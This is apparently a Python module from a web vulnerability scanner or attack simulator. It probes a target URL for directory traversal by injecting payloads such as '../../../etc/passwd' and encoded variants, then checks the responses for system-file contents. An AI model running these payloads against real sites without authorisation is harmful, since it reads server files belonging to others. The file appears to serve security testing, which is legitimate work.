import requests
from .base import AttackModule
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class DirectoryTraversalModule(AttackModule):
    name = "Directory Traversal"
    description = "Detecta vulnerabilidades de Path Traversal"
    severity = "high"
    
    def run(self, target: str) -> dict:
        session = requests.Session()
        session.verify = False
        headers = {'User-Agent': 'AttackSim/1.0'}
        
        # Payloads de path traversal
        traversal_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
            "..;/..;/..;/etc/passwd",
            "/etc/passwd",
            "file:///etc/passwd",
        ]
        
        # Indicadores de sucesso
        success_indicators = [
            "root:x:0:0",           # /etc/passwd
            "[extensions]",          # win.ini
            "root:/root:/bin/bash",  # /etc/passwd
            "daemon:x:1:1",          # /etc/passwd
        ]
        
        results = []
        
        for payload in traversal_payloads:
            try:
                # Injetar payload como parâmetro
                if '?' in target and '=' in target:
                    base, param = target.split('?', 1)
                    param_name, value = param.split('=', 1)
                    test_url = f"{base}?{param_name}={payload}"
                else:
                    test_url = f"{target}?file={payload}"
                
                response = session.get(test_url, headers=headers, timeout=10)
                content = response.text
                
                # Verificar indicadores de arquivos do sistema
                for indicator in success_indicators:
                    if indicator in content:
                        results.append({
                            "type": "Path Traversal",
                            "payload": payload,
                            "evidence": f"System file content detected: '{indicator}'",
                            "url": test_url,
                            "confidence": "critical"
                        })
                        break
                        
            except Exception as e:
                continue
        
        if results:
            return {
                "success": True,
                "severity": "critical",
                "details": f"🎯 CRITICAL: Found {len(results)} directory traversal vulnerabilities!",
                "findings": results[:3],
                "remediation": "Validate and sanitize file paths. Use a whitelist of allowed files."
            }
        
        return {
            "success": False,
            "severity": "info",
            "details": "No directory traversal vulnerabilities detected"
        }
